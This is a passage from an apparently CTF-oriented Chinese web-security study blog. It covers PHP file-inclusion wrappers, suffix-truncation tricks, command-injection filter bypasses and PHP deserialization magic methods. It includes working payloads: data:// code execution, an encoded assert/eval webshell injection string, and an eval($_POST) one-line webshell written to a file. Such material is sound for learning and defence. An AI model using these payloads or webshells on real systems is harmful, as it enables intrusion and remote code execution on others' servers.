<p><img src="/2022/05/28/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></p>
<blockquote>
<p>即可以<u>直接读取到POST上</u>没有经过解析的原始数据。 <strong>enctype&#x3D;”multipart&#x2F;form-data”</strong> 的时候 php:&#x2F;&#x2F;input 是<strong>无效</strong>的</p>
</blockquote>
<p><code>注</code> ：</p>
<blockquote>
<p>查看当前运行的是哪个php.ini<br>2,3需要将php可执行加入环境变量, 如果没有加,那么请使用php可执行文件所在位置的完整路径代替</p>
</blockquote>
<blockquote>
<ol>
<li></li>
</ol>
<p>打印出<code>phpinfo();</code> 找到<code>Loaded Configuration File</code>那一行</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png" alt="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png"></p>
<blockquote>
<ol start="2">
<li></li>
</ol>
<p>命令行输入</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">php</span> -<span class="variable">i</span> |<span class="variable">grep</span> <span class="variable">php.ini</span>（<span class="variable">php</span> -<span class="variable">i</span>其实就是输出<span class="function"><span class="title">phpinfo</span>();)</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">php -r “phpinfo();” <span class="string">|grep php.ini</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="4-file-x2F-x2F-伪协议（读取文件内容）"><a href="#4-file-x2F-x2F-伪协议（读取文件内容）" class="headerlink" title="4.file:&#x2F;&#x2F;伪协议（读取文件内容）"></a>4.file:&#x2F;&#x2F;伪协议（读取文件内容）</h4><p>   <strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span> （均不受影响）</span><br></pre></td></tr></table></figure>

<p>打<code>ctf</code>中常用于读取本地文件</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>:<span class="comment">//C:\Windows\System32\drivers\etc\hosts</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="5-phar-x2F-x2F-伪协议-读取压缩包文件内容"><a href="#5-phar-x2F-x2F-伪协议-读取压缩包文件内容" class="headerlink" title="5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)"></a>5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)</h4><p><strong>·条件</strong></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (均不受影响)</span><br></pre></td></tr></table></figure>

<p><code>注</code>：</p>
<blockquote>
<p>php 版本大于等于<code>5.3.0</code>，压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
</blockquote>
<p><strong>·格式</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=phar:<span class="regexp">//</span>压缩包名/内部文件名</span><br></pre></td></tr></table></figure>

<p>例，</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">phar:<span class="regexp">//</span>x.zip/x.php</span><br></pre></td></tr></table></figure>

<h4 id="6-zip-x2F-x2F-伪协议"><a href="#6-zip-x2F-x2F-伪协议" class="headerlink" title="6.zip:&#x2F;&#x2F;伪协议"></a>6.zip:&#x2F;&#x2F;伪协议</h4><blockquote>
<p>zip伪协议和phar协议类似，但是用法不一样（url不同）</p>
</blockquote>
<p><strong>·条件</strong></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (均不受影响)</span><br></pre></td></tr></table></figure>

<p><strong>·格式</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=zip:<span class="regexp">//</span>[压缩文件绝对路径]<span class="comment">#[压缩文件内的子文件名]</span></span><br></pre></td></tr></table></figure>

<p>例，</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">zip:<span class="regexp">//</span>D:\phpstudy\WWW\x.zip%<span class="number">23</span>shell.php       <span class="comment">#-&gt;%23</span></span><br></pre></td></tr></table></figure>

<h4 id="7-data-x2F-x2F-伪协议-读取文件"><a href="#7-data-x2F-x2F-伪协议-读取文件" class="headerlink" title="7.data:&#x2F;&#x2F;伪协议(读取文件)"></a>7.data:&#x2F;&#x2F;伪协议(读取文件)</h4><blockquote>
<p>（可以直接达到执行php代码的效果）<br>和<code>php://input</code>很像，<code>php://input</code>以<code>post</code>提交数据那样提交数据，<br><code>data://</code>是以<code>get</code>方式提交数据，也是可以执行提交的脚本</p>
</blockquote>
<p><strong>·格式</strong></p>
<blockquote>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo()<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>如果对特殊字符进行了过滤，可以通过base64编码后再输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data://text/plain;<span class="built_in">base64</span>,<span class="built_in">base64</span>加密的代码</span><br></pre></td></tr></table></figure>

<p>可配合<a href="https://www.cnblogs.com/xiaozi/p/7831529.html">php命令执行漏洞</a>，实现对一些数据的获取<br>如：<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
</blockquote>
<h4 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h4><blockquote>
<p><a href="https://blog.csdn.net/dreamthe/article/details/121765876">参考实例1</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/106658417">参考实例2</a></p>
</blockquote>
<h3 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h3><h4 id="1）路径长度绕过后缀"><a href="#1）路径长度绕过后缀" class="headerlink" title="1）路径长度绕过后缀"></a>1）路径长度绕过后缀</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=@$_GET[<span class="string">&#x27;123&#x27;</span>];</span><br><span class="line"><span class="title function_">include</span>($a.<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如果限制了文件类型，比如这里只能包含<code>html</code>后缀的文件，那么就可以使用此方法</p>
<p><code>操作系统存在最大路径长度的限制</code></p>
<blockquote>
<p>windows系统，文件名最长256个字符</p>
<p>linux系统，文件名最长4096个字符(浏览器最多只能输入300多个字符，所以需要抓包)<br>前面加.&#x2F;.&#x2F;.&#x2F;.&#x2F;…………xx.php</p>
</blockquote>
<p>可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，<code>导致扩展名被中途截断</code></p>
<p>在文件后面加<code>.</code> 如： </p>
<blockquote>
<p>info.php………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………….html&#96;</p>
<p><code>.</code>超过256个就行，后面多出来的<code>...........................................html</code>不会被识别到</p>
</blockquote>
<h4 id="2）-截断后缀"><a href="#2）-截断后缀" class="headerlink" title="2）? 截断后缀"></a>2）? 截断后缀</h4><p>往往文件包含中会出现</p>
<blockquote>
<p><code>(&quot;$file&quot;.&quot;.html&quot;)</code><br>这里以html为例子，这样我们输入的文件名称参数后面终会跟上.html后缀，从而导致文件包含失败</p>
<p>要截断后缀，只需要在末尾添加 <code>?</code> 即可，这样后缀就会变成 URL 的参数</p>
</blockquote>
<hr>
<h2 id="八、logic-loophole"><a href="#八、logic-loophole" class="headerlink" title="八、logic loophole"></a>八、logic loophole</h2><blockquote>
<p>一般在支付购买处代码，对数据处理出现逻辑错误，对用户输入的数据没有进行严格审查，导致逻辑漏洞，使得用户获取不属于他的权限或者信息内容</p>
</blockquote>
<hr>
<h2 id="九、command-execution"><a href="#九、command-execution" class="headerlink" title="九、command execution"></a>九、command execution</h2><h3 id="1-有关命令执行的知识（windows-或-linux-下）"><a href="#1-有关命令执行的知识（windows-或-linux-下）" class="headerlink" title="1.有关命令执行的知识（windows 或 linux 下）:"></a>1.有关命令执行的知识（windows 或 linux 下）:</h3><blockquote>
<p><code>1）command1 ; command2 用;隔开表示为多个命令，命令按照从左到右的顺序执行，彼此无关联，所有的命令都会执行。先执行 command1 后执行 command2</code></p>
<p><code>2）command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</code></p>
<p><code>3）command1 | command2 将两个命令分开，左边命令的输出作为右边命令的输入，只执行 command2</code></p>
<p><code>4）command1 &amp; command2 &amp;表示任务后台执行，与nohup命令功能差不多，先执行 command2 后执行 command1</code></p>
<p><code>5）command1 || command2 先执行 command1，如果为假，再执行 command2</code></p>
<p><code>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</code></p>
</blockquote>
<p>eg:</p>
<p><code>find  / -name &quot;flag* &quot;</code><br>在当前目录及其子目录下查找文件名中包含<code>flag</code>的文件<br><code>find  / -name &quot; *.txt&quot;</code><br>在当前目录及其子目录下查找后缀为<code>txt</code>的文件</p>
<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><h4 id="1-过滤cat"><a href="#1-过滤cat" class="headerlink" title="1.过滤cat"></a>1.过滤cat</h4><blockquote>
<p><code>more，less，head，tac</code>都可以对文本进行读取</p>
</blockquote>
<h4 id="2-过滤空格"><a href="#2-过滤空格" class="headerlink" title="2.过滤空格"></a>2.过滤空格</h4><blockquote>
<p><code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code>来代替空格</p>
</blockquote>
<blockquote>
<p><code>&lt;,&gt;</code>是把内容导向某个地方，可以是文件，也可以是命令</p>
<p>如<code>cat&lt;flag.php</code>就是相当于，把flag.php内容用cat命令显示出来</p>
<p><code>%09</code>是tab键，可以补全内容</p>
<p>比如过滤了flag，但是需要访问<code>flag233.php</code></p>
<p>那么就可以<code>cat %09*233.php</code>，就可以了</p>
</blockquote>
<h4 id="3-过滤目录分隔符"><a href="#3-过滤目录分隔符" class="headerlink" title="3.过滤目录分隔符"></a>3.过滤目录分隔符</h4><blockquote>
<p>也就是&#x2F;不能用了，不能直接查看文件目录</p>
<p><code>cat /flag_is_here/flag_9012297169124.php</code></p>
<p>可以<strong>利用分号使两个命令同时进行</strong>也就是</p>
<p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p>
</blockquote>
<h4 id="4-过滤运算符"><a href="#4-过滤运算符" class="headerlink" title="4.过滤运算符"></a>4.过滤运算符</h4><p>可以用<code>;</code>代替管道运算符</p>
<h4 id="5-绕过正则匹配"><a href="#5-绕过正则匹配" class="headerlink" title="5.绕过正则匹配"></a>5.绕过正则匹配</h4><p>比如</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<p><code>所有大小写字母和数字都被正则匹配过滤</code></p>
<p>这里就需要</p>
<h5 id="法1：取反绕过："><a href="#法1：取反绕过：" class="headerlink" title="法1：取反绕过："></a>法1：取反绕过：</h5><p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
</blockquote>
<p>然后再赋值</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意后面要有<code>;</code>代表php代码结束<br>这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反<br>等同于</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">?<span class="meta">code</span>=(<span class="meta">assert</span>)(eval($_REQUEST[<span class="number">8</span>]))</span><br></pre></td></tr></table></figure>

<p>(assert)因为是assert是函数，被当作函数执行，于是因为<code>断言(eval($_REQUEST[8]))</code>，所以把<code>eval($_REQUEST[8])</code>当作<code>php</code>执行，于是就可以拿到<code>shell</code>了</p>
</blockquote>
<p>蚁剑连接</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h5 id="法2：异或绕过"><a href="#法2：异或绕过" class="headerlink" title="法2：异或绕过:"></a>法2：异或绕过:</h5><p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br> 例如：异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p>
<blockquote>
<p>字符：?         ASCII码：63           二进制：  00‭11 1111‬<br>字符：~         ASCII码：126          二进制：  0111 1110‬<br>异或规则：<br>1   XOR   0   &#x3D;   1<br>0   XOR   1   &#x3D;   1<br>0   XOR   0   &#x3D;   0<br>1   XOR   1   &#x3D;   0<br>上述两个字符异或得到 二进制：  0100 0001<br>该二进制的十进制也就是：65<br>对应的ASCII码是：A</p>
</blockquote>
<p>本题preg_replace()过滤了<code>所有英文字母和数字</code>，但是<em>ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</em></p>
<blockquote>
<p>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p>
</blockquote>
<h5 id="法3：反斜杠-转义绕过"><a href="#法3：反斜杠-转义绕过" class="headerlink" title="法3：反斜杠\转义绕过"></a>法3：反斜杠\转义绕过</h5><p>对于</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="variable">$ip</span>,<span class="variable">$match</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在这个正则匹配中并没有过滤反斜杠<code>\</code></p>
<p>所以虽然我们执行<code>ls</code>之类会被过滤，但是执行<code>l\s</code>时，会绕过<code>ls</code>的匹配，但是仍然能实现<code>ls</code>的功能</p>
<p>对于文件名比如<code>php</code>过滤，也可以用反义字符<code>p\ph</code>，同样也可以绕过</p>
</blockquote>
<h4 id="6-绕过长度限制"><a href="#6-绕过长度限制" class="headerlink" title="6.绕过长度限制"></a>6.绕过长度限制</h4><p><code>&gt;</code>和<code>&gt;&gt;</code>两个符号的使用</p>
<blockquote>
<p>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</p>
</blockquote>
<p><img src="/2022/05/28/Web-study/image-20220926223728694.png" alt="image-20220926223728694"></p>
<blockquote>
<p><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</p>
</blockquote>
<p><img src="/2022/05/28/Web-study/image-20220926223749908.png" alt="image-20220926223749908"></p>
<h4 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h4><blockquote>
<p>ls</p>
<p>cat</p>
<p>touch</p>
<p>#创建文件，一般创建脚本文件，</p>
<p>比如<code>touch haha.php</code></p>
<p>然后再执行</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>

<p>，在脚本文件里写一串一句话木马</p>
<p><strong>但是注意因为有$，后面的看可能会被当做变量，所以可以加上反斜杠\转义</strong></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>
</blockquote>
<hr>
<h2 id="十、brute-force"><a href="#十、brute-force" class="headerlink" title="十、brute force"></a>十、brute force</h2><p>一把搜哈就完事（奸笑）</p>
<hr>
<h2 id="十一、Deserialization-Vulnerabilities（PHP）-1"><a href="#十一、Deserialization-Vulnerabilities（PHP）-1" class="headerlink" title="十一、Deserialization Vulnerabilities（PHP）"></a>十一、Deserialization Vulnerabilities（PHP）</h2><blockquote>
<p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">原文链接1</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/377676274">原文链接2</a></p>
</blockquote>
<h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><blockquote>
<p><strong>序列化</strong>(Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
</blockquote>
<h3 id="php的序列化和反序列化"><a href="#php的序列化和反序列化" class="headerlink" title="php的序列化和反序列化"></a>php的序列化和反序列化</h3><blockquote>
<p>概念：<code>php的序列化将对象转化为了字符串，包含了对象的所有数据信息，</code><br><code>反序列化时再根据这些信息还原对象。</code></p>
<p><u>php的序列化和反序列化由serialize()和unserialize()</u>这两个函数来完成。serialize()完成序列化的操作，将传入的值转换为序列化后的字符串；而unserialize()完成反序列化的操作，将字符串转换成原来的变量。</p>
<p><code>serialize(mixed $value): string</code><br>serialize()返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方：</p>
<p>O::””::{&lt;field name 1&gt;&lt;field value 1&gt;…}</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>  </p>
<blockquote>
<p>当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。<br><code>unserialize(string $str): mixed</code><br>  unserialize()对单一的已序列化的变量进行操作，将其转换回 PHP 的值。<br>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 wakeup() 成员函数（如果存在的话）。</p>
</blockquote>
<p>注意：</p>
<p><code>private声明</code></p>
<blockquote>
<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</p>
<p>因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</p>
<p>%00也就是空字符，无法复制，只能自己修改二进制，或者自己加上</p>
</blockquote>
<h3 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h3><blockquote>
<p><a href="https://blog.csdn.net/qq_45552960/article/details/102664372">原文链接</a></p>
</blockquote>
<p> PHP中以两个下划线开头的方法，</p>
<blockquote>
<p><code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()，__autoload()</code></p>
</blockquote>
<p>被称为”魔术方法”（Magic methods）。这些方法在一定条件下有特殊的功能，在<code>命名自己的类方法时不能使用这些方法名</code>，除非是想使用其魔术功能</p>
<p>与序列化和反序列化的魔术方法主要是：</p>
<blockquote>
<p>__construct()	&#x2F;&#x2F;当一个对象创建时被调用</p>
<p>__destruct() 	&#x2F;&#x2F;对象被销毁时触发</p>
<p>__wakeup() 	&#x2F;&#x2F;使用unserialize时触发</p>
<p>__sleep() 	&#x2F;&#x2F;使用serialize时触发</p>
<p>__toString() 	&#x2F;&#x2F;把类当做字符串时触发<br>1.{因为echo无法输出对象，所以可以利用该魔法方法，在直接输出对象引用的时候，就不会产生错误，而是自动调用了”__toString()”方法, 输出“__toString()”方法中返回的字符，所以“__toString()”方法一定要有个返回值(return 语句)}<br>2.当然除了当作字符串打印时会触发，当把实例化的类当作字符串进行preg_match匹配时，也会触发</p>
<p>__get() 	&#x2F;&#x2F;用于从不可访问的属性读取数据</p>
<p>__set() 	&#x2F;&#x2F;用于将数据写入不可访问的属性</p>
<p>__invoke()  &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p>
<p>__call()     &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p>
<p>__callStatic()  &#x2F;&#x2F;在静态上下文中调用不可访问的属性</p>
<p>__isset()   &#x2F;&#x2F;当对不可访问属性调用isset()或empty()时调用</p>
<p>__set_state()   &#x2F;&#x2F;调用var_export()导出类时，此静态方法会被调用。</p>
<p>__clone()  &#x2F;&#x2F;当对象复制完成时调用</p>
<p>__autoload()   &#x2F;&#x2F;尝试加载未定义的类</p>
<p>__debugInfo()   &#x2F;&#x2F;打印所需调试信息</p>
</blockquote>
<p>·注意：</p>
<blockquote>
<p>PHP 将所有以 <code>__</code>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 <code>__</code> 为前缀。</p>
<p><strong>·sleep() 和 wakeup()</strong></p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">public __sleep ( void )<span class="keyword"> :</span><span class="built_in"> array</span></span><br><span class="line"><span class="built_in"></span>__wakeup ( void )<span class="keyword"> :</span> void</span><br></pre></td></tr></table></figure>

<p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 <code>NULL</code> 被序列化，并产生一个 <code>E_NOTICE</code> 级别的错误。</p>
<p><strong>Note</strong></p>
<blockquote>
<ol>
<li>__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</li>
<li>__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</li>
<li>与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</li>
<li>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</li>
</ol>
</blockquote>
<p><strong>访问控制</strong></p>
<blockquote>
<ul>
<li>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</li>
<li>public（公有）：公有的类成员可以在任何地方被访问。</li>
<li>protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。</li>
<li>private（私有）：私有的类成员则只能被其定义所在的类访问。</li>
</ul>
</blockquote>
<p><code>unserialize() 将已序列化的字符串还原回 PHP 的值。</code><br><code>序列化请使用 serialize() 函数。</code></p>
<p><strong>语法</strong></p>
<blockquote>
<p><code>unserialize(str)</code></p>
<p>参数    描述<br><code>str</code>    必需。一个序列化字符串。<br>__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。</p>
</blockquote>
</blockquote>
<hr>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在<code>序列化</code>和<code>反序列化</code>过程是不会触发的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure>

<p>可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。</p>
<hr>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure>

<p>可以看到执行了两次<code>__destruct()</code>，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>
<hr>
